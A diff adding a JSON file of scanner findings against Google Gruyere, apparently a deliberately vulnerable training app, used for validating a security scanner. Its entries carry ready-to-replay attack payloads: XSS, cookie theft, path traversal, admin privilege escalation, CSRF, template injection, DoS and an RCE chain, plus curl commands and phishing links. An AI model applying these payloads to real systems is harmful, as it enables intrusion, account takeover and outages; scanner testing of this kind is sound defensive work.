+      "title": "Unauthenticated server shutdown via quitserver",
+      "category": "denial_of_service",
+      "type": "unauthenticated_shutdown",
+      "cwe": "CWE-862",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/quitserver",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/quitserver",
+        "method": "GET",
+        "params": {},
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/quitserver"
+      },
+      "payload": "GET /quitserver",
+      "evidence": {
+        "expected_status": [
+          200,
+          302,
+          500
+        ],
+        "expected_indicators": [
+          "non-admin can access quitserver endpoint",
+          "server instance stops responding until restarted"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": false,
+        "destructive": true,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Protect quitserver with server-side admin authorization inside the dangerous handler.",
+      "tags": [
+        "dos",
+        "manual-only",
+        "destructive"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/quitserver",
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "GET /quitserver",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": true,
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/quitserver",
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": true
+      }
+    },
+    {
+      "id": "GRUYERE-DOS-002",
+      "title": "Protected reset endpoint bypass through case mismatch",
+      "category": "denial_of_service",
+      "type": "case_sensitive_authorization_bypass",
+      "cwe": "CWE-178",
+      "owasp": "A01:2021-Broken Access Control",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.99,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/RESET",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/RESET",
+        "method": "GET",
+        "params": {},
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/RESET"
+      },
+      "payload": "GET /RESET",
+      "evidence": {
+        "expected_status": [
+          200,
+          302,
+          500
+        ],
+        "expected_indicators": [
+          "protected URL check is case-sensitive",
+          "routing lookup capitalizes handler name after authorization check"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": false,
+        "destructive": true,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Normalize URL path before authorization and enforce authorization inside sensitive functions.",
+      "tags": [
+        "dos",
+        "auth-bypass",
+        "manual-only",
+        "destructive"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/RESET",
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "GET /RESET",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": false,
+        "destructive": true,
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/RESET",
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": true
+      }
+    },
+    {
+      "id": "GRUYERE-DOS-003",
+      "title": "Template recursion DoS through uploaded menubar.gtl",
+      "category": "denial_of_service",
+      "type": "recursive_template_dos",
+      "cwe": "CWE-674",
+      "owasp": "A05:2021-Security Misconfiguration",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.96,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/upload",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "authenticated_user": "../resources",
+          "file_name": "menubar.gtl",
+          "file_content": "[[include:menubar.gtl]]DoS[[/include:menubar.gtl]]"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload"
+      },
+      "payload": "[[include:menubar.gtl]]DoS[[/include:menubar.gtl]]",
+      "evidence": {
+        "expected_status": [
+          200,
+          302,
+          500
+        ],
+        "expected_indicators": [
+          "every page includes menubar.gtl",
+          "recursive include overloads template renderer"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": true,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Prevent path traversal/template upload and add recursion/depth limits to template engine.",
+      "tags": [
+        "dos",
+        "template",
+        "manual-only",
+        "destructive"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "[[include:menubar.gtl]]DoS[[/include:menubar.gtl]]",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": true,
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": true
+      }
+    },
+    {
+      "id": "GRUYERE-RCE-001",
+      "title": "Remote code execution chain by overwriting template infrastructure then restarting",
+      "category": "rce",
+      "type": "arbitrary_code_execution_chain",
+      "cwe": "CWE-94",
+      "owasp": "A03:2021-Injection",
+      "severity": "critical",
+      "cvss_estimate": null,
+      "confidence": 0.95,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/upload",
+        "method": "POST",
+        "params": {},
+        "body": {
+          "file_name": "../gtl.py",
+          "file_content": "modified GTL Python module"
+        },
+        "auth_required": true,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/upload"
+      },
+      "payload": "overwrite gtl.py or sanitize.py via path traversal; trigger restart through quitserver",
+      "evidence": {
+        "expected_status": [
+          200,
+          302,
+          500
+        ],
+        "expected_indicators": [
+          "application can write files in Gruyere directory",
+          "modified Python support module runs after server restart"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": true,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Run app with least privilege, make application code read-only, separate uploads from executable code, and fix path traversal/write issues.",
+      "tags": [
+        "rce",
+        "chain",
+        "manual-only",
+        "destructive"
+      ],
+      "payload_replay": {
+        "full_payload_url": null,
+        "copy_paste_test_url": null,
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": null,
+        "raw_payload": "overwrite gtl.py or sanitize.py via path traversal; trigger restart through quitserver",
+        "url_encoded_payload": null,
+        "method": "POST",
+        "requires_authentication": true,
+        "state_changing": true,
+        "destructive": true,
+        "disabled_reason": "Dangerous/destructive payload. Kept in finding metadata only; do not put it in auto-run URL lists."
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "POST",
+        "full_payload_url": null,
+        "baseline_url": null,
+        "curl_command": null,
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": true
+      }
+    },
+    {
+      "id": "GRUYERE-AJAX-001",
+      "title": "AJAX duplicate key DOM/data overwrite using username private_snippet",
+      "category": "ajax",
+      "type": "client_side_data_clobbering",
+      "cwe": "CWE-20",
+      "owasp": "A04:2021-Insecure Design",
+      "severity": "medium",
+      "cvss_estimate": null,
+      "confidence": 0.95,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "new",
+          "uid": "private_snippet",
+          "pw": "secret"
+        },
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret"
+      },
+      "payload": "uid=private_snippet + at least one snippet",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "feed JSON object contains duplicate private_snippet key",
+          "attacker snippet overwrites private snippet value in client"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Use robust JSON structure that separates private data from user-keyed map and avoid allowing user values to become object keys without namespacing.",
+      "tags": [
+        "ajax",
+        "dom",
+        "account-creation"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "uid=private_snippet + at least one snippet",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    },
+    {
+      "id": "GRUYERE-AJAX-002",
+      "title": "AJAX DOM clobbering phishing through username menu-right",
+      "category": "ajax",
+      "type": "dom_clobbering_phishing",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021-Injection",
+      "severity": "high",
+      "cvss_estimate": null,
+      "confidence": 0.95,
+      "status": "confirmed_vulnerable_target",
+      "detection_kind": "payload_replay_signature",
+      "target": {
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret",
+        "base_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/",
+        "path": "/saveprofile",
+        "method": "GET",
+        "params": {
+          "action": "new",
+          "uid": "menu-right",
+          "pw": "secret"
+        },
+        "body": null,
+        "auth_required": false,
+        "real_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret"
+      },
+      "payload": "<a href='https://evil.example.com/login'>Sign in</a> | <a href='https://evil.example.com/newaccount.gtl'>Sign up</a>",
+      "evidence": {
+        "expected_status": [
+          200,
+          302
+        ],
+        "expected_indicators": [
+          "username collides with DOM id menu-right",
+          "AJAX refresh replaces sign-in/sign-up menu area"
+        ],
+        "source": "gruyere_target_reference",
+        "validation_notes": "Replay this finding against the real target URL and confirm using expected indicators plus baseline response comparison. Do not mark live confirmed from HTTP status alone."
+      },
+      "execution_policy": {
+        "safe_to_auto_test": false,
+        "state_changing": true,
+        "destructive": false,
+        "manual_only": true,
+        "rate_limit_hint": "single_request_only; do_not_flood"
+      },
+      "remediation": "Do not use user-controlled values as DOM IDs; namespace generated IDs and update only intended nodes.",
+      "tags": [
+        "ajax",
+        "phishing",
+        "dom-clobbering"
+      ],
+      "payload_replay": {
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret",
+        "copy_paste_test_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret",
+        "browser_open_safe": false,
+        "scanner_auto_test_safe": false,
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "<a href='https://evil.example.com/login'>Sign in</a> | <a href='https://evil.example.com/newaccount.gtl'>Sign up</a>",
+        "url_encoded_payload": null,
+        "method": "GET",
+        "requires_authentication": false,
+        "state_changing": true,
+        "destructive": false,
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret'"
+      },
+      "real_test_replay": {
+        "ready": true,
+        "method": "GET",
+        "full_payload_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "curl_command": "curl -i --max-time 15 'https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret'",
+        "auto_safe": false,
+        "manual_only": true,
+        "destructive": false
+      }
+    }
+  ],
+  "negative_findings": [
+    {
+      "id": "GRUYERE-NEG-001",
+      "title": "SQL injection not applicable to Gruyere target scope",
+      "category": "negative_finding",
+      "status": "not_applicable",
+      "reason": "Official Gruyere vulnerable target states Gruyere does not use SQL, so SQL injection is outside this target's covered vulnerabilities.",
+      "scanner_action": "Do not score SQLi misses against Gruyere real-test unless you add a custom SQL-backed target."
+    },
+    {
+      "id": "GRUYERE-NEG-002",
+      "title": "Buffer/integer overflow not applicable to Gruyere target scope",
+      "category": "negative_finding",
+      "status": "not_applicable",
+      "reason": "Gruyere is Python-based and the vulnerable target says it does not cover typical buffer/integer overflow vulnerabilities.",
+      "scanner_action": "Do not score binary memory-safety findings against this web real-test."
+    }
+  ],
+  "import_hints_for_your_project": {
+    "recommended_default_filter": "run only findings where execution_policy.safe_to_auto_test == true",
+    "manual_real_test_filter": "allow state_changing checks only on a disposable Gruyere instance after login and with reset_url saved",
+    "never_auto_run_filter": "execution_policy.destructive == true",
+    "real_test_validation_tip": "Treat confirmed_vulnerable_target as ground truth targetels. Your scanner should independently detect safe_auto_test items first, then add authenticated/state-changing checks later.",
+    "recommended_import_collection": "real_target_payloads",
+    "recommended_mode": "deep-real-test"
+  },
+  "source_references": [
+    "https://google-gruyere.appspot.com/",
+    "https://google-gruyere.appspot.com/part1",
+    "https://google-gruyere.appspot.com/part2",
+    "https://google-gruyere.appspot.com/part3",
+    "https://google-gruyere.appspot.com/part4",
+    "https://google-gruyere.appspot.com/part5"
+  ],
+  "payload_url_index": {
+    "description": "Ready-to-use payload list appended for Threat Hunters import. Safe GET URLs can be copy/pasted or replayed by the scanner. Manual entries require auth, POST, or state-changing handling. Blocked entries are intentionally not promoted as runnable URLs.",
+    "safe_get_copy_paste_urls_count": 5,
+    "manual_requests_count": 15,
+    "blocked_destructive_count": 6,
+    "safe_get_copy_paste_urls": [
+      {
+        "id": "GRUYERE-XSS-001",
+        "title": "Reflected XSS in invalid path error renderer",
+        "category": "xss",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": "<script>alert(1)</script>",
+        "expected_indicators": [
+          "payload appears inside error page without correct escaping",
+          "browser executes script in google-gruyere.appspot.com origin"
+        ]
+      },
+      {
+        "id": "GRUYERE-XSS-002",
+        "title": "Reflected XSS through AJAX feed uid parameter",
+        "category": "xss",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl?uid=cheddar",
+        "raw_payload": "<script>alert(1)</script>",
+        "expected_indicators": [
+          "_feed(([\"<script>alert(1)</script>\"]))",
+          "response served as text/html / script-interpretable content"
+        ]
+      },
+      {
+        "id": "GRUYERE-XSSI-001",
+        "title": "XSSI leaks private snippet through feed.gtl script inclusion",
+        "category": "xssi",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": "<script>function _feed(s){alert(s['private_snippet']);}</script><script src=\"https://google-gruyere.appspot.com/574388963472090736253170060715792825341/feed.gtl\"></script>",
+        "expected_indicators": [
+          "feed.gtl is executable script containing private_snippet",
+          "attacker page can define _feed and read callback data"
+        ]
+      },
+      {
+        "id": "GRUYERE-PT-001",
+        "title": "Path traversal reads secret.txt",
+        "category": "path_traversal",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/%2e%2e%2fsecret.txt",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": "../secret.txt",
+        "expected_indicators": [
+          "secret.txt content returned outside resources directory",
+          "encoded traversal bypasses browser normalization"
+        ]
+      },
+      {
+        "id": "GRUYERE-CONFIG-001",
+        "title": "Debug dump.gtl exposes database",
+        "category": "security_misconfiguration",
+        "severity": "critical",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/dump.gtl",
+        "method": "GET",
+        "baseline_url": null,
+        "raw_payload": null,
+        "expected_indicators": [
+          "database contents displayed",
+          "cleartext user passwords exposed"
+        ]
+      }
+    ],
+    "manual_requests": [
+      {
+        "id": "GRUYERE-XSS-003",
+        "title": "Stored XSS through snippet HTML sanitizer bypass",
+        "category": "xss",
+        "severity": "high",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>",
+        "expected_indicators": [
+          "created snippet is rendered back to visitors",
+          "onmouseover event handler survives sanitizer"
+        ],
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "snippet": "<a onmouseover=\"alert(1)\" href=\"#\">read this!</a>"
+        }
+      },
+      {
+        "id": "GRUYERE-XSS-004",
+        "title": "Stored XSS sanitizer case-sensitivity bypass",
+        "category": "xss",
+        "severity": "high",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>",
+        "expected_indicators": [
+          "uppercase event attribute bypasses case-sensitive blacklist",
+          "payload remains executable in browser"
+        ],
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "snippet": "<a ONMOUSEOVER=\"alert(1)\" href=\"#\">read this!</a>"
+        }
+      },
+      {
+        "id": "GRUYERE-XSS-005",
+        "title": "Stored XSS through profile color attribute injection",
+        "category": "xss",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red%27+onload%3D%27alert%281%29%27+onmouseover%3D%27alert%282%29",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red",
+        "raw_payload": "red' onload='alert(1)' onmouseover='alert(2)",
+        "expected_indicators": [
+          "color rendered inside single-quoted style attribute",
+          "single quote escapes style attribute and injects onload/onmouseover"
+        ],
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-XSS-006",
+        "title": "Stored XSS through unsafe CSS color value",
+        "category": "xss",
+        "severity": "medium",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=expression%28alert%281%29%29",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&color=red",
+        "raw_payload": "expression(alert(1))",
+        "expected_indicators": [
+          "unsafe CSS expression accepted as profile color",
+          "browser-dependent script execution in CSS-capable engines"
+        ],
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-XSS-007",
+        "title": "Stored XSS through AJAX feed eval and quote injection",
+        "category": "xss",
+        "severity": "high",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "all <span style=display:none>\"\n+ (alert(1),\"\")\n+ \"</span>your base",
+        "expected_indicators": [
+          "feed.gtl JSON-like response becomes executable JavaScript expression",
+          "client code evaluates feed response using eval"
+        ],
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "snippet": "all <span style=display:none>\"\n+ (alert(1),\"\")\n+ \"</span>your base"
+        }
+      },
+      {
+        "id": "GRUYERE-XSS-008",
+        "title": "File upload XSS: uploaded HTML executes in site origin",
+        "category": "xss",
+        "severity": "high",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "<script>alert(document.cookie)</script>",
+        "expected_indicators": [
+          "uploaded .html served from google-gruyere.appspot.com origin",
+          "script can read Gruyere cookies"
+        ],
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "file_name": "xss.html",
+          "file_content": "<script>alert(document.cookie)</script>"
+        }
+      },
+      {
+        "id": "GRUYERE-AC-001",
+        "title": "Privilege escalation via untrusted profile update parameter",
+        "category": "broken_access_control",
+        "severity": "critical",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True",
+        "raw_payload": "is_admin=True",
+        "expected_indicators": [
+          "server accepts is_admin from non-admin profile update",
+          "user becomes administrator after re-login"
+        ],
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-AC-002",
+        "title": "Arbitrary user privilege escalation through uid parameter",
+        "category": "broken_access_control",
+        "severity": "critical",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&is_admin=True&uid=cheddar",
+        "raw_payload": "uid=cheddar&is_admin=True",
+        "expected_indicators": [
+          "uid parameter lets attacker modify another user",
+          "target account can be marked admin"
+        ],
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-COOKIE-001",
+        "title": "Cookie delimiter injection via username",
+        "category": "client_state_manipulation",
+        "severity": "critical",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=foo%7Cadmin%7Cauthor&pw=secret",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "uid=foo|admin|author",
+        "expected_indicators": [
+          "cookie format is hash|username|admin|author",
+          "username delimiter creates malformed cookie interpreted as admin"
+        ],
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-COOKIE-002",
+        "title": "Client-side account length limit bypass for administrator cookie injection",
+        "category": "client_state_manipulation",
+        "severity": "critical",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=administrator%7Cadmin%7Cauthor&pw=secret",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "administrator|admin|author",
+        "expected_indicators": [
+          "16-character username limit exists only client-side",
+          "direct request can create delimiter-injected administrator-style username"
+        ],
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-CSRF-001",
+        "title": "CSRF delete snippet through GET request without token",
+        "category": "csrf",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0",
+        "raw_payload": "<img src=\"https://google-gruyere.appspot.com/574388963472090736253170060715792825341/deletesnippet?index=0\" style=\"display:none\">",
+        "expected_indicators": [
+          "state-changing delete action uses GET",
+          "no unpredictable action token is required"
+        ],
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-CONFIG-002",
+        "title": "Template upload can recreate debug dump exposure",
+        "category": "security_misconfiguration",
+        "severity": "critical",
+        "url": null,
+        "method": "POST",
+        "baseline_url": null,
+        "raw_payload": "upload .gtl file",
+        "expected_indicators": [
+          "uploaded .gtl treated as server template",
+          "attacker-controlled template can access database values"
+        ],
+        "disabled_reason": "This finding needs a POST/form request, so a URL alone is not enough.",
+        "form_fields": {
+          "file_name": "dump.gtl",
+          "file_content": "debug dump template or similar database-reading GTL"
+        }
+      },
+      {
+        "id": "GRUYERE-TI-001",
+        "title": "Template injection leaks database through private snippet",
+        "category": "template_injection",
+        "severity": "critical",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=%7B%7B_db%3Apprint%7D%7D",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=update&private_snippet=test",
+        "raw_payload": "{{_db:pprint}}",
+        "expected_indicators": [
+          "template engine reparses expanded variables",
+          "_db:pprint exposes database content"
+        ],
+        "disabled_reason": "This URL requires a logged-in session/cookie before it can prove the finding.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-AJAX-001",
+        "title": "AJAX duplicate key DOM/data overwrite using username private_snippet",
+        "category": "ajax",
+        "severity": "medium",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=private_snippet&pw=secret",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "uid=private_snippet + at least one snippet",
+        "expected_indicators": [
+          "feed JSON object contains duplicate private_snippet key",
+          "attacker snippet overwrites private snippet value in client"
+        ],
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "form_fields": null
+      },
+      {
+        "id": "GRUYERE-AJAX-002",
+        "title": "AJAX DOM clobbering phishing through username menu-right",
+        "category": "ajax",
+        "severity": "high",
+        "url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=menu-right&pw=secret",
+        "method": "GET",
+        "baseline_url": "https://google-gruyere.appspot.com/574388963472090736253170060715792825341/saveprofile?action=new&uid=cheddar&pw=secret",
+        "raw_payload": "<a href='https://evil.example.com/login'>Sign in</a> | <a href='https://evil.example.com/newaccount.gtl'>Sign up</a>",
+        "expected_indicators": [
+          "username collides with DOM id menu-right",
+          "AJAX refresh replaces sign-in/sign-up menu area"
+        ],
+        "disabled_reason": "This GET changes server/account state; keep manual-only unless you run a disposable test account.",
+        "form_fields": null
+      }
+    ],
+    "blocked_destructive_payloads": [
+      {
+        "id": "GRUYERE-PT-002",
